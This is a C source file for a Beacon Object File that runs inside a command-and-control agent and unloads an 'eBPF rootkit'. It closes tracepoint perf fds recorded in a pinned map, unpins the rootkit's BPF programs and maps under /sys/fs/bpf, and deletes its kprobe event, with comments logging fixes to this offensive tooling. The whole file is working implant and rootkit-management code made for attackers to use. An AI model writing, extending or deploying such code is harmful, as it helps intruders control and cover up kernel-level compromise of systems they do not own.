/// ebpf_unload.c — BOF: failsafe unload for the eBPF rootkit (Phase 2)
///
/// Usage: execute bof ebpf_unload.o <pin> [kprobe_spec]
///   pin:         the pin name used at load (unpins /sys/fs/bpf/<pin>_*)
///   kprobe_spec: optional "p:group/name" or "r:group/name" — removes the
///                debugfs kprobe event created by ebpf_load (use the same
///                group/name; format "-:group/name" is appended)
///
/// 立即 detach（ISS-008）：perf_event fd 是 **agent 进程内**的资源，而 BOF 就跑在
/// 同一进程里 —— 只要知道 fd 号就能 close 掉、让 tracepoint 当场 detach。
/// loader 已把这批 fd 记进 <pin>_map6，本 BOF 先读回来逐个 close，再 unlink pin。
/// （旧注释声称"BOF 做不到即时 detach / documented limitation"——那是错的。）
///
/// 顺序很重要：**先 close 再 unlink**。pin 一旦 unlink，map 对象可能就取不回来，
/// 也就再也拿不到那批 fd。

#include "bof_api.h"

#define BPF_MAP_LOOKUP_ELEM 1
#define BPF_OBJ_GET         7

struct bpf_attr_get {
    unsigned long pathname;
    unsigned int  bpf_fd;
    unsigned int  file_flags;
};

struct bpf_attr_lookup {
    unsigned long map_fd;
    unsigned long key;
    unsigned long value;
};

/* 参数 blob 不保证 NUL 终止：pin 后面紧跟的是 kprobe 字段的 4 字节长度字。
 * 旧写法 AxStrcat(path, pin) 是靠"长度字恰好为 0"侥幸正确的 —— 一旦调用方
 * 传了非空 kprobe_spec，pin 就会被拼上垃圾字节（ISS-029）。 */
static int ax_cstr(char *dst, int cap, const char *src, int len) {
    if (!dst || cap <= 0) return 0;
    dst[0] = 0;
    if (!src || len <= 0) return 0;
    if (len > cap - 1) len = cap - 1;
    AxMemcpy(dst, src, len);
    dst[len] = 0;
    return len;
}

// Unpinning a /sys/fs/bpf object is plain unlink().  The previous version called
// bpf(BPF_OBJ_PIN) with bpf_fd = 0, which does NOT unpin anything — the kernel
// returns EINVAL, so "failsafe unload" left every pin (and therefore every
// program) alive.  Verified on 6.8: BPF_OBJ_PIN{path, fd=0} -> EINVAL.
static long ax_unpin(const char *path) {
    return (long)AxUnlink(path);
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);
    int pin_len = 0, kp_len = 0;
    char *pin = BeaconDataExtract(&parser, &pin_len);
    char *kp = BeaconDataExtract(&parser, &kp_len);

    char pinbuf[128];
    if (ax_cstr(pinbuf, (int)sizeof(pinbuf), pin, pin_len) <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ebpf_unload: missing pin name\n");
        return;
    }

    // ── 1. 先 close tracepoint perf fd（= 当场 detach，ISS-008）──
    {
        char mpath[192];
        AxSnprintf(mpath, sizeof(mpath), "/sys/fs/bpf/%s_map6", pinbuf);
        struct bpf_attr_get ga;
        AxMemset(&ga, 0, sizeof(ga));
        ga.pathname = (unsigned long)mpath;
        long mfd = AxBpf(BPF_OBJ_GET, &ga, sizeof(ga));
        if (mfd >= 0) {
            int closed = 0;
            for (unsigned int i = 0; i < 16; i++) {
                int v = 0;
                struct bpf_attr_lookup lk;
                AxMemset(&lk, 0, sizeof(lk));
                lk.map_fd = (unsigned long)mfd;
                lk.key    = (unsigned long)&i;
                lk.value  = (unsigned long)&v;
                if (AxBpf(BPF_MAP_LOOKUP_ELEM, &lk, sizeof(lk)) == 0 && v > 2) {
                    AxCloseFile(v);
                    closed++;
                }
            }
            AxCloseFile((int)mfd);
            BeaconPrintf(CALLBACK_OUTPUT,
                         "[+] ebpf_unload: closed %d perf fd(s) — tracepoint detached\n", closed);
        }
    }

    // ── 2. Unpin everything ──
    const char *suffixes[] = {"_prog", "_link", "_map0", "_map1", "_map2", "_map3", "_map4", "_map5", "_map6", "_map7"};
    int unloaded = 0;
    for (unsigned i = 0; i < sizeof(suffixes) / sizeof(suffixes[0]); i++) {
        char path[192];
        AxStrcpy(path, "/sys/fs/bpf/");
        AxStrcat(path, pinbuf);
        AxStrcat(path, suffixes[i]);
        long r = ax_unpin(path);
        if (r == 0) {
            unloaded++;
        } else {
            // ENOENT (-2) = already gone — fine; report other errors
            if (r != -2)
                BeaconPrintf(CALLBACK_ERROR, "[-] ebpf_unload: unpin %s failed (err=%ld)\n", path, -r);
        }
    }

    // ── 3. Remove the debugfs kprobe event ──
    if (kp && kp_len > 0) {
        char kpbuf[160];
        if (ax_cstr(kpbuf, (int)sizeof(kpbuf), kp, kp_len) > 0) {
            // "-:group/name"
            char spec[176];
            AxSnprintf(spec, sizeof(spec), "-:%s",
                       (kpbuf[0] == 'p' || kpbuf[0] == 'r') ? kpbuf + 2 : kpbuf);
            int fd = AxOpenFile("/sys/kernel/tracing/kprobe_events", 1 | 0x400, 0644);
            if (fd >= 0) {
                AxWriteFile(fd, spec, AxStrlen(spec));
                AxWriteFile(fd, "\n", 1);
                AxCloseFile(fd);
                BeaconPrintf(CALLBACK_OUTPUT, "[+] ebpf_unload: kprobe event removed (%s)\n", spec);
            }
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] ebpf_unload: unpinned %d objects for '%s'\n", unloaded, pinbuf);
}
